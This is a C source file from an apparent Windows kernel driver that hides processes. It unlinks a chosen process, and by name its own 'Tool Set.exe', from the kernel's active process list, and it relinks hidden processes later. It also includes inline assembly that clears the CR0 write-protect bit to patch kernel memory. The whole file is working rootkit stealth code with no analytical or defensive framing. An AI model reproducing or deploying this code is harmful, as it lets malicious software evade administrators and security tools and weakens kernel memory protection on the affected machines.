#include"HideOwn.h"
#include"typedef.h"
NTSTATUS HideProc(UINT32 Pid)
{
	NTSTATUS Status=STATUS_UNSUCCESSFUL;
	PEPROCESS Tempproc;
	Tempproc = (PEPROCESS)PsActiveProcessHead->Flink;
	for (;(PVOID)Tempproc != (PVOID)PsActiveProcessHead;)
	{
		Tempproc = (PEPROCESS)((PUCHAR)Tempproc - dwProcLinkOffer);
		if (Pid == (UINT32)PsGetProcessId(Tempproc))
		{
			off_protect_page();
			RemoveEntryList((PLIST_ENTRY)((PUCHAR)Tempproc + dwProcLinkOffer));
			on_protect_page();

			HidePid[Index] = Pid;
			Index++;
			Status = STATUS_SUCCESS;
			break;
		}
		Tempproc = (PEPROCESS)((PUCHAR)Tempproc+ dwProcLinkOffer);
		Tempproc = (PEPROCESS)((PLIST_ENTRY)Tempproc)->Flink;
	}
	return Status;
}

NTSTATUS HideOwnProc()
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	PDefProcessStruct Tempproc;
	Tempproc = (PDefProcessStruct)g_ProcessSingleHead.Next;
	
	while (Tempproc)
	{
		if (!wcsncmp(L"Tool Set.exe\0",
			(PWCHAR)Tempproc->Path + Tempproc->NameOffsets,
			sizeof(L"Tool Set.exe\0")))
		{
			Status = HideProc(Tempproc->Pid);
			break;
		}
		Tempproc = Tempproc->NextList;
	}

	return Status;
}

NTSTATUS  HideRecovery(UINT32 Pid)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PDefProcessStruct tempproc;
	tempproc = (PDefProcessStruct)g_ProcessSingleHead.Next;
	while (tempproc)
	{
		if (tempproc->Pid == Pid)
		{
			PLIST_ENTRY link, link4;
			PEPROCESS eProc;
			eProc = tempproc->eProcess;
			link = (PLIST_ENTRY)((PCHAR)eProc + dwProcLinkOffer);
			link4 = PsActiveProcessHead->Flink;
			off_protect_page();
			InsertTailList(link4, link);
			on_protect_page();
			status = STATUS_SUCCESS;
			break;
		}
		tempproc = tempproc->NextList;
	}
	return status;
}

NTSTATUS TotolRecovery()
{
	for (UINT32 i = 0; i < Index; i++)
	{
		__try{
			HideRecovery(HidePid[i]);
		}
		__except (1)
		{
			return STATUS_UNSUCCESSFUL;
		}
	}
	return STATUS_SUCCESS;
}



void off_protect_page()
{
	__asm{
		cli
			push eax
			mov eax, cr0
			and eax, not 10000h
			mov cr0, eax
			pop eax
	}
}

void on_protect_page()
{
	_asm{
		push eax
			mov eax, cr0
			or eax, 10000h
			mov cr0, eax
			pop eax
			sti
	}
}